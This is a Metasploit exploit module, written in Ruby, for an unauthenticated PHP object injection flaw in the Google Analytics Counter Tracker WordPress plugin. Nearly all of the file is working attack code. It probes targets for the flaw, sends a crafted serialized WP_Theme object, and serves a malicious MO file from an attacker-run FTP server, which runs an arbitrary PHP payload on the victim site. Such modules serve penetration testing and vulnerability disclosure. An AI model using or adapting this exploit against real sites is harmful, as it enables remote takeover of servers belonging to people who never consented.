##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::FtpServer
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Google Analytics Counter Tracker WordPress Plugin Unauthenticed PHP Object Injection Vulnerability',
      'Description'    => %q{
        A PHP Object injection vulnerability was found in Google Analytics Counter Tracker,
        which can be used by an unautenthicated user to instantiated arbitrary PHP Objects
        This module exploits the vulnerability to load a malicious MO file from an FTP server
        that results in the execution of arbitrary PHP code (tested on WordPress 4.5.3 - 4.7.4).
      },
      'Platform'       => 'php',
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Yorick Koster',
          # Finder
          'Remco Vermeulen'
        ],
      # n is converted to $n in make_plural_form_function()
      'Payload'        => { 'BadChars' => "n" } ,
      'References'     =>
        [
          ['URL', 'https://securify.nl/advisory/SFY20160606/analytics_stats_counter_statistics_wordpress_plugin_unauthenticated_php_object_injection_vulnerability.html'],
          ['URL', 'https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing']
        ],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
      [
        ['Google Analytics Counter Tracker < 3.5.1', { 'auto' => true }  ]
      ],
      'DisclosureDate' => 'Dec 11 2016',
      'DefaultTarget'  => 0))

        register_options(
        [
          OptAddress.new('LHOST', [ true, 'The local IP address from where the victim downloads the MO payload' ]),
          OptPort.new('SRVPORT', [ true, "The local port to use for the FTP server", 21 ]),
          OptString.new('TARGETURI', [ true, "The base path to the web application", "/"])
        ])

    deregister_options('SSLVersion', 'SSLCert')
  end

  def check
    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => target_uri.path,
        'vars_post' => {
          'wpadm_ga_request' => Base64.encode64('O:3:"PDO":0:{}')
        }
      })
      if (res && res.code == 500)
        return Exploit::CheckCode::Appears
      end

      if (res && res.body.include?('Uncaught PDOException'))
        return Exploit::CheckCode::Appears
      end

      return Exploit::CheckCode::Safe

      rescue ::Rex::ConnectionError
        return Exploit::CheckCode::Safe
      end
  end

  def exploit
    check_code = check

    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears
      print_error("#{peer} - Failed to detect a vulnerable instance")
      fail_with(Failure::NoTarget, "#{peer} - Failed to detect a vulnerable instance")
    end

    print_status("#{peer} - Exploiting #{target.name}")

    headers =  "Content-Type: text/plain; charset=UTF-8\n"
    headers << "Plural-Forms: nplurals=2; plural=n);}#{payload.encoded}die();/*"

    @mo_file = "\xde\x12\x04\x95\x00\x00\x00\x00\x01\x00\x00\x00\x1c\x00\x00\x00"
    @mo_file << "\x24\x00\x00\x00\x03\x00\x00\x00\x2c\x00\x00\x00\x00\x00\x00\x00"
    @mo_file << "\x38\x00\x00\x00"
    @mo_file << [headers.length].pack('V*')
    @mo_file << "\x39\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    @mo_file << headers
    @mo_file << "\x00"

    wp_theme_name = rand_text_alpha_lower(10)
    wp_theme_text_domain = rand_text_alpha_lower(10)
    wp_theme_stylesheet = rand_text_alpha_lower(10)
    wp_theme_theme_root = 'ftp://' + datastore['LHOST'] + ':' + datastore['SRVPORT'].to_s

    wp_theme =  "a:1:{s:4:\"sign\";"
    wp_theme << "O:8:\"WP_Theme\":3:{s:17:\"\x00WP_Theme\x00headers\";a:2:{"
    wp_theme << "s:4:\"Name\";s:#{wp_theme_name.length}:\"#{wp_theme_name}\";"
    wp_theme << "s:10:\"TextDomain\";s:#{wp_theme_text_domain.length}:\"#{wp_theme_text_domain}\";}"
    wp_theme << "s:20:\"\x00WP_Theme\x00stylesheet\";s:#{wp_theme_stylesheet.length}:\"#{wp_theme_stylesheet}\";"
    wp_theme << "s:20:\"\x00WP_Theme\x00theme_root\";s:#{wp_theme_theme_root.length}:\"#{wp_theme_theme_root}\";}"
    wp_theme << "}"

    print_status("Starting the FTP server")
    start_service()

    send_request_cgi({
      'method' => 'POST',
      'uri' => target_uri.path,
      'vars_post' => {
        'wpadm_ga_request' => Rex::Text.encode_base64(wp_theme)
      }
    })

    print_status("Stopping the FTP server")
    stop_service()
  end

  def on_client_command_retr(c,arg)
    print_status("#{@state[c][:name]} FTP download request for #{arg}")

    conn = establish_data_connection(c)
    if(not conn)
      c.put("425 Can't build data connection\r\n")
      return
    end

    c.put("150 Opening BINARY mode data connection for #{arg}\r\n")
    conn.put(@mo_file)
    c.put("226 Transfer complete.\r\n")
    conn.close
  end

  def on_client_command_size(c,arg)
    print_status("#{@state[c][:name]} FTP size request for #{arg}")
    c.put("213 #{@mo_file.length}\r\n")
  end
end
